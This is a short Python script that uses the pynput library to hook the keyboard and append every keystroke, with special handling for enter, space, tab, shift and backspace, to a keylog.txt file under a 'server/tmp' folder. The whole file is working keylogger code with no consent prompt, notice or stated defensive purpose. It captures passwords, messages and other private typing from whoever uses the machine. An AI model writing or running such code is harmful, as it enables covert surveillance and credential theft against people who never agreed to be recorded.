from pynput import keyboard
import os

tmp_path = os.path.join(os.getcwd(), 'server/tmp')

def on_press(key):
  with open(os.path.join(tmp_path, 'keylog.txt'), 'a') as f:
    # Special charactersa
    if key == keyboard.Key.enter:
      key = '\n'
    if key == keyboard.Key.space:
      key = ' '
    if key == keyboard.Key.tab:
      key = '\t'
    if key == keyboard.Key.shift:
      key = ''
    if key == keyboard.Key.backspace:
      key = '<backspace>'


    key = str(key).replace("'", '')
  
    f.write(str(key))

with keyboard.Listener(on_press=on_press) as listener:
  listener.join()